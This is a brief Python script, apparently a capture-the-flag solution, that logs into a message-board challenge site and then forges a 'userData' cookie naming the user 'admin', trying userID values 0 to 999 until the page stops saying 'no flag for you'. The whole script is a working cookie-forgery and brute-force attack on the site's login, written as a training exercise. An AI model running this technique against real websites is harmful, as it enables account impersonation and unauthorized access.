import requests


s = requests.Session()

url = 'https://message-board.hsc.tf/login'
body = {'username': 'kupatergent', 'password':'gandal'}
headers = {}

res = s.post(url, data=body, headers=headers)
s.cookies.clear()
#print(res.text)


for i in range(0,1000):
	cookiestring = f"j%3A%7B%22userID%22%3A%22{i}%22%2C%22username%22%3A%22admin%22%7D"	
	print(i)
	res1 = s.get("https://message-board.hsc.tf/" , cookies = {'userData': cookiestring})
	#print(res1.text)
	if "no flag for you" not in res1.text:
		print(res1.text) 
  
s.close()